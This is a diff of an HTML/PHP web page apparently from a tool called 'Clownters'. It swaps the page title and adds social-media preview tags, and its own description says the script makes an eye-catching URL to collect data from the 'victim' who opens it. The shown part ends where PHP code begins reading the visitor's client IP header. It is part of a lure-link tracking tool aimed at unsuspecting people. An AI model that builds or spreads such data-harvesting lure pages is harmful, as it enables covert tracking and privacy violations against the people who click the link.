@@ -2,8 +2,14 @@
 <html>
 <head>
 <meta charset="UTF-8"/>
-<title>Flores</title>
-<link rel="icon" href="https://imgs.search.brave.com/cxPD8LrtZjgbL6pgH9FPFVYHw1v7B_xBPDJZVeDWoYI/rs:fit:632:225:1/g:ce/aHR0cHM6Ly90c2Ux/Lm1tLmJpbmcubmV0/L3RoP2lkPU9JUC5I/dlFEQ2xPYS02SV82/eFVWdGFhTzlRSGFG/aiZwaWQ9QXBp">
+<meta property="og:type" content="website"/>
+<meta property="og:title" content="Clownters"/>
+<meta content="https://user-images.githubusercontent.com/82988362/215275753-140fda88-c496-481b-add9-3c82968f6c4b.jpg" property="og:image">
+<meta content="Organização Clownters" property="og:title">
+<meta property="og:description" content="@MIke90s15 - Script que criar uma url chamativa com objetivo de coleta de dados assim que a vitima acessar"/>
+<meta property="og:url" content="https://clownters.com" />
+<title>Clownters</title>
+<link rel="icon" href="https://raw.githubusercontent.com/mike90s15/cloud/main/Clownters/Imagens/IMG_20220225_170641_796.jpg">
   <style>
   body
   {
@@ -15,7 +21,9 @@
   {
   font-size:30px;
   }
-  </style>                                                      </head>                                                         <body>
+  </style>
+</head>
+<body>
 <!-- Clownters -->
 <?php                                                           if (!empty($_SERVER['HTTP_CLIENT_IP']))
     {
